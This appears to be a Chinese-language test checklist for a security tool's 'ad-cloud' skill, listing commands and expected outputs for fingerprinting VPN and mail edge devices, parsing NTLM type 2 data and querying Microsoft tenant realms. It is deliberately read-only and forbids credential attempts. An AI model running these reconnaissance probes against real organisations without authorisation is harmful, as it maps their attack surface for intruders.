  1) `python Tool/skill/_pending/ad-cloud/scripts/ad-repro.py --kind edge-fingerprint --fixture Tool/cases/ad-cloud01/input/edge-fingerprint.json` → rc=0｜期望输出：`"ok": true`、`"kind": "edge-fingerprint"`、`"offline": true`、`results` 10 条、`summary` 含 `candidate/high`=9 与 `candidate/med`=1（`microsoft-owa` 缺 `X-OWA-Version` 只能 med）、每条 `auth_attempted`: false
  2) `python Tool/skill/_pending/ad-cloud/scripts/ad-repro.py --kind ntlm-type2 --input Tool/cases/ad-cloud01/input/ntlm-type2.json --json` → rc=0｜期望输出：`"verdict": "candidate"`、`"dns_domain": "corp.local"`、`"os_version": "10.0.20348"`、`"timestamp": "2026-10-21T14:00:00Z"`、`"auth_attempted": false`、`checks` 6 条全 true
  3) `python Tool/skill/_pending/ad-cloud/scripts/ad-repro.py --self-test` → rc=0｜期望输出：`{"ok": true, "checks": 24, "kinds": 9}`，含 `edge_products`: 10
  4) `python Tool/skill/_pending/ad-cloud/scripts/ad-repro.py --kind edge-fingerprint --url https://<target>/` → rc=0｜期望：`product`/`confidence`/`evidence[{header,path,value}]`/`judgement` 均有值；无厂商串时 `verdict`: blocked（`--strict` rc=3），不猜服务
  5) `curl -skI https://<target>/+CSCOE+/logon.html` → rc=0｜期望：200/302 且 `Set-Cookie: webvpn=`/页内 `AnyConnect`；404 且无厂商串 = blocked，换厂商
  6) `curl -s 'https://login.microsoftonline.com/getuserrealm.srf?login=<user>@<domain>&xml=1'` → rc=0｜期望：`<NameSpaceType>Managed|Federated</NameSpaceType>` + `AuthURL`；域不匹配/404 = 换域；其余只读面（Okta well-known / Zimbra GetVersionInfoRequest）只看公开字段
- 判据：`--kind edge-fingerprint` 输出 `product`/`confidence`/`evidence`/`judgement`，单线索=low、两条独立线索=med、专属 cookie/版本串+专属路径=high；`high` 仍只到 `candidate`（暴露面）；`auth_attempted` 恒 false；证据包写“未提交凭据/未爆破/未投毒/未发利用包”；NTLM type 2 只到 candidate
- 失败判据：只有端口/登录页、metadata 要登录、租户不匹配、SOAP 要求 authToken、AuthURL 指向清单外 IdP → blocked/unknown；不得用默认口令、CVE 路径字典或用户名枚举升级验证
- reference：Tool/skill/_pending/ad-cloud/references/ad-attacks.md
